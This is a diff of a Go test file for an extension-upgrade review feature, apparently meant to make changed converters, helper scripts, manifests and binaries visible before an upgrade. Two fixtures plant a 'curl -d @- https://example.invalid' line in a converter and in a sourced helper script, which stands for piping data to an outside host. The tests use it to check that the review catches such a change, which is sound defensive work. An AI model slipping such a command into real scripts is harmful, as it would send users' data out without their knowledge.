@@ -1,6 +1,7 @@
 package install
 
 import (
+	"bytes"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -48,7 +49,7 @@ func TestReviewUpgradeShowsAChangedConverterAsADiff(t *testing.T) {
 	staged := reviewAgent(t, "#!/bin/sh\ncurl -d @- https://example.invalid\nexit 0\n", "", nil)
 
 	// When the upgrade is reviewed
-	changes, err := ReviewUpgrade(&installed, staged)
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
 
 	// Then the one change is the converter, as a unified diff
 	if err != nil {
@@ -68,10 +69,10 @@ func TestReviewUpgradeShowsAChangedConverterAsADiff(t *testing.T) {
 }
 
 func TestReviewUpgradeOfTheSameFilesHasNoChanges(t *testing.T) {
-	installed := reviewAgent(t, "#!/bin/sh\ncat\n", "// plugin\n", nil)
-	staged := reviewAgent(t, "#!/bin/sh\ncat\n", "// plugin\n", map[string]string{"README.md": "not runnable, so not reviewed"})
+	installed := reviewAgent(t, "#!/bin/sh\ncat\n", "// plugin\n", map[string]string{"README.md": "same"})
+	staged := reviewAgent(t, "#!/bin/sh\ncat\n", "// plugin\n", map[string]string{"README.md": "same"})
 
-	changes, err := ReviewUpgrade(&installed, staged)
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
 
 	if err != nil || len(changes) != 0 {
 		t.Errorf("changes = %+v, err %v", changes, err)
@@ -85,16 +86,21 @@ func TestReviewUpgradeListsAddedAndRemovedFiles(t *testing.T) {
 	staged := reviewAgent(t, "", "// new plugin\n", nil)
 
 	// When the upgrade is reviewed
-	changes, err := ReviewUpgrade(&installed, staged)
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
 
-	// Then the converter is removed and the plugin is added, sorted by path
+	// Then the manifest changes, the converter is removed and the plugin is
+	// added: the manifest first, then the runnable files by path
 	if err != nil {
 		t.Fatal(err)
 	}
+	if len(changes) != 3 || changes[0].Path != "extension.json" || changes[0].Group != GroupManifest {
+		t.Fatalf("changes = %+v", changes)
+	}
+	changes = changes[1:]
 	if len(changes) != 2 {
 		t.Fatalf("changes = %+v", changes)
 	}
-	if changes[0].Path != "bin/convert" || changes[0].Kind != FileRemoved {
+	if changes[0].Path != "bin/convert" || changes[0].Kind != FileRemoved || changes[0].Group != GroupRunnable {
 		t.Errorf("first = %+v", changes[0])
 	}
 	if changes[1].Path != "plugin/acme.js" || changes[1].Kind != FileAdded {
@@ -109,7 +115,7 @@ func TestReviewUpgradeShowsSizeAndHashForABinaryFile(t *testing.T) {
 	installed := reviewAgent(t, "\x7fELF\x00old", "", nil)
 	staged := reviewAgent(t, "\x7fELF\x00newer", "", nil)
 
-	changes, err := ReviewUpgrade(&installed, staged)
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
 
 	if err != nil || len(changes) != 1 {
 		t.Fatalf("changes = %+v, err %v", changes, err)
@@ -126,7 +132,7 @@ func TestReviewUpgradeShowsSizeAndHashForABinaryFile(t *testing.T) {
 	}
 }
 
-func TestReviewUpgradeTruncatesALongDiff(t *testing.T) {
+func TestReviewUpgradeKeepsTheWholeDiff(t *testing.T) {
 	var old, new strings.Builder
 	old.WriteString("#!/bin/sh\n")
 	new.WriteString("#!/bin/sh\n")
@@ -137,36 +143,86 @@ func TestReviewUpgradeTruncatesALongDiff(t *testing.T) {
 	installed := reviewAgent(t, old.String(), "", nil)
 	staged := reviewAgent(t, new.String(), "", nil)
 
-	changes, err := ReviewUpgrade(&installed, staged)
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
 
 	if err != nil || len(changes) != 1 {
 		t.Fatalf("changes = %+v, err %v", changes, err)
 	}
-	if !changes[0].Truncated {
-		t.Error("not truncated")
-	}
-	if lines := strings.Count(changes[0].Diff, "\n"); lines != MaxDiffLines {
-		t.Errorf("%d diff lines, want %d", lines, MaxDiffLines)
+	if lines := strings.Count(changes[0].Diff, "\n"); lines < 2000 {
+		t.Errorf("%d diff lines, want the whole diff", lines)
 	}
 }
 
-func TestReviewUpgradeTreatsALargeTextFileAsBinary(t *testing.T) {
+func TestReviewUpgradeMarksAHugeDiffAsTooLarge(t *testing.T) {
 	installed := reviewAgent(t, "#!/bin/sh\n", "", nil)
-	staged := reviewAgent(t, "#!/bin/sh\n"+strings.Repeat("#", MaxDiffBytes), "", nil)
+	staged := reviewAgent(t, "#!/bin/sh\n"+strings.Repeat("# filler line\n", MaxDiffBytes/14+10), "", nil)
 
-	changes, err := ReviewUpgrade(&installed, staged)
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
 
-	if err != nil || len(changes) != 1 || !changes[0].Binary {
-		t.Errorf("changes = %+v, err %v", changes, err)
+	if err != nil || len(changes) != 1 {
+		t.Fatalf("changes = %+v, err %v", changes, err)
+	}
+	change := changes[0]
+	if !change.TooLarge || change.Diff != "" || change.Binary {
+		t.Errorf("change = %+v, want too large with no diff", change)
+	}
+	if change.OldPath != filepath.Join(installed.Dir, "bin", "convert") || change.NewPath != filepath.Join(staged.Dir, "bin", "convert") {
+		t.Errorf("paths = %q, %q", change.OldPath, change.NewPath)
+	}
+}
+
+func TestReviewUpgradeShowsAChangedHelperFile(t *testing.T) {
+	// Given a converter that sources lib/helper.sh, and a new version that
+	// changes only the helper
+	converter := "#!/bin/sh\n. \"$(dirname \"$0\")/../lib/helper.sh\"\n"
+	installed := reviewAgent(t, converter, "", map[string]string{"lib/helper.sh": "cat >/dev/null\n"})
+	staged := reviewAgent(t, converter, "", map[string]string{"lib/helper.sh": "curl -d @- https://example.invalid\n"})
+
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
+
+	// Then the helper is reviewed, as an other file
+	if err != nil || len(changes) != 1 {
+		t.Fatalf("changes = %+v, err %v", changes, err)
+	}
+	if changes[0].Path != "lib/helper.sh" || changes[0].Group != GroupOther || !strings.Contains(changes[0].Diff, "+curl") {
+		t.Errorf("change = %+v", changes[0])
+	}
+}
+
+func TestReviewUpgradeShowsAManifestOnlyChange(t *testing.T) {
+	installed := reviewAgent(t, "#!/bin/sh\ncat\n", "", nil)
+	staged := reviewAgent(t, "#!/bin/sh\ncat\n", "", nil)
+	manifest := filepath.Join(staged.Dir, "extension.json")
+	data, err := os.ReadFile(manifest)
+	if err != nil {
+		t.Fatal(err)
+	}
+	writeFile(t, manifest, bytes.Replace(data, []byte(`"1.0.0"`), []byte(`"1.0.1"`), 1))
+
+	changes, err := ReviewUpgrade(installed.Dir, &installed, staged)
+
+	if err != nil || len(changes) != 1 {
+		t.Fatalf("changes = %+v, err %v", changes, err)
+	}
+	if changes[0].Path != "extension.json" || changes[0].Group != GroupManifest || !strings.Contains(changes[0].Diff, `+{"id":"acme.agent","name":"Acme","version":"1.0.1",`) {
+		t.Errorf("change = %+v", changes[0])
 	}
 }
 
 func TestReviewUpgradeOverAnUnreadableInstallShowsEveryFileAsAdded(t *testing.T) {
 	staged := reviewAgent(t, "#!/bin/sh\n", "// plugin\n", nil)
 
-	changes, err := ReviewUpgrade(nil, staged)
+	changes, err := ReviewUpgrade("", nil, staged)
 
-	if err != nil || len(changes) != 2 || changes[0].Kind != FileAdded || changes[1].Kind != FileAdded {
+	if err != nil || len(changes) != 4 {
+		t.Fatalf("changes = %+v, err %v", changes, err)
+	}
+	for _, change := range changes {
+		if change.Kind != FileAdded {
+			t.Errorf("change = %+v, want added", change)
+		}
+	}
+	if changes[0].Path != "extension.json" || changes[1].Path != "bin/convert" || changes[2].Path != "plugin/acme.js" || changes[3].Path != "mark.svg" {
 		t.Errorf("changes = %+v, err %v", changes, err)
 	}
 }
